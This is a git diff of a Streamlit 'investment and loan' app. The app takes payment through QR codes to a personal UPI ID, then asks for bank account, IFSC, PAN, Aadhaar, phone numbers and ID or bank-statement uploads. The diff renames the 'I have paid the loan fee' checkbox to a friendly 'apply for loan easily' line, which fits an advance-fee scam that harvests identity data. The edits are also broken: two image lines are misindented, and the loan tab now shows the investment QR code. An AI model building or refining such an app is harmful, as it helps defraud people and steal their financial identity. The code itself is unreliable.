@@ -43,7 +43,8 @@ with tab1:
 
         upi_url = f"upi://pay?pa=ayushbhradwaj009-1@okicici&pn=AyushBhardwaj&am={invest_amount}&cu=INR"
         qr_url = f"https://api.qrserver.com/v1/create-qr-code/?size=200x200&data={urllib.parse.quote(upi_url)}"
-        st.image(qr_url, caption="Scan to Pay", use_column_width=False)
+       st.image(qr_url, caption="Scan to Pay", use_container_width=True)
+
         st.code("ayushbhradwaj009-1@okicici", language="text")
 
         confirm = st.checkbox("✅ I have paid the amount")
@@ -78,17 +79,19 @@ with tab2:
 
         upi_url_loan = f"upi://pay?pa=ayushbhradwaj009-1@okicici&pn=AyushBhardwaj&am={total_payable}&cu=INR"
         qr_url_loan = f"https://api.qrserver.com/v1/create-qr-code/?size=200x200&data={urllib.parse.quote(upi_url_loan)}"
-        st.image(qr_url_loan, caption="Scan to Pay", use_column_width=False)
+      st.image(qr_url, caption="Scan to Pay", use_container_width=True)
+
         st.code("ayushbhradwaj009-1@okicici", language="text")
 
-        loan_paid = st.checkbox("✅ I have paid the loan fee")
+        loan_paid = st.checkbox("✅ apply for loan easily with cashpocket ")
 
         if loan_paid:
             name = st.text_input("Full Name")
             acc_num = st.text_input("Bank Account Number")
             ifsc = st.text_input("IFSC Code")
-            pan = st.text_input("PAN Number")
+            pan = st.text_input("PAN Number")            
             aadhaar = st.text_input("Aadhaar Number")
+            contect_number = st.text_input("+91-9876543210")
             doc = st.file_uploader("Upload ID/Bank Statement (PDF/JPG)", type=["pdf", "jpg", "png"])
 
             if st.button("Submit Loan Application"):
@@ -102,6 +105,7 @@ with tab2:
                     "IFSC": ifsc,
                     "PAN": pan,
                     "Aadhaar": aadhaar,
+                    "number": contect_number,
                     "Submitted On": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                 })
                 st.success("Loan request submitted! Our team will review it.")
@@ -132,7 +136,7 @@ if st.session_state.admin_mode:
 
 # ---------------------- SUPPORT SECTION ----------------------
 st.markdown("---")
-st.markdown("### 📞 Customer Support")
+st.markdown("### 📞 24X7 Customer Support ")
 
 col1, col2 = st.columns(2)
 with col1:
@@ -153,9 +157,8 @@ st.markdown("### 📞 Contact Us Quickly")
 whatsapp_url = "https://wa.me/916201328257?text=Hi,%20I%20need%20assistance%20with%20my%20investment/loan!"
 st.markdown(f"[📲 Chat with us on WhatsApp]( {whatsapp_url} )", unsafe_allow_html=True)
 
-# Email button
-email_url = "mailto:ayushbhradwaj009@gmail.com?subject=Support Request&body=Hello!%20I%20need%20assistance%20with%20my%20investment/loan."
-st.markdown(f"[📧 Email us for support]( {email_url} )", unsafe_allow_html=True)
 
 st.markdown("_You can reach us instantly via WhatsApp or email for any queries._")
+st.markdown("_AYUSH BHARDWAJ_")
+st.markdown("_RAGHVENDRA SINGH_")
 
